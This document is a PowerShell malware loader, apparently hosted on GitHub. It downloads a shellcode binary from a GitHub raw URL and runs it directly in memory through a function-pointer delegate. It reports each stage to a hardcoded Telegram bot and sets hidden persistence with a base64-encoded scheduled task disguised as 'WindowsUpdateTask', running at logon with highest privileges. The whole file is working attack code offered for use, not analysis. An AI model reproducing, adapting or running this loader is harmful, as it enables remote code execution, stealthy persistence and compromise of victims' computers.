# script.ps1 - hosted on GitHub
$botToken = "8529568747:AAHhyujxYwQkPmwP_lkK6zJEOvf8TxMv14I"
$chatId = "8461590707"

function Send-Telegram($msg) {
    try {
        $json = @{chat_id=$chatId; text=$msg} | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $json -ContentType "application/json" | Out-Null
    } catch {}
}

try {
    Send-Telegram "PS Script started on $env:COMPUTERNAME"
    
    # Download shellcode
    $url = "https://github.com/bobo22e/bobo/raw/refs/heads/main/agent-windows-amd64-0e8c5426.bin.sgn"
    Send-Telegram "Downloading from: $url"
    
    $c = (New-Object Net.WebClient).DownloadData($url)
    Send-Telegram "Downloaded $($c.Length) bytes"
    
    # Execute
    $m = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($c.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($c, 0, $m, $c.Length)
    Send-Telegram "Executing shellcode..."
    
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m, [Action]).Invoke()
    Send-Telegram "Shellcode executed"
    
    # Persistence
    $psCmd = "-WindowStyle Hidden -Command `"`$c=(New-Object Net.WebClient).DownloadData('$url');`$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(`$c.Length);[System.Runtime.InteropServices.Marshal]::Copy(`$c,0,`$m,`$c.Length);[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`$m,[System.Action]).Invoke()`""
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($psCmd))
    schtasks /create /tn "WindowsUpdateTask" /tr "powershell -WindowStyle Hidden -EncodedCommand $encoded" /sc onlogon /rl highest /f 2>&1 | Out-Null
    Send-Telegram "Persistence set"
    
} catch {
    Send-Telegram "ERROR: $($_.Exception.Message)"
}
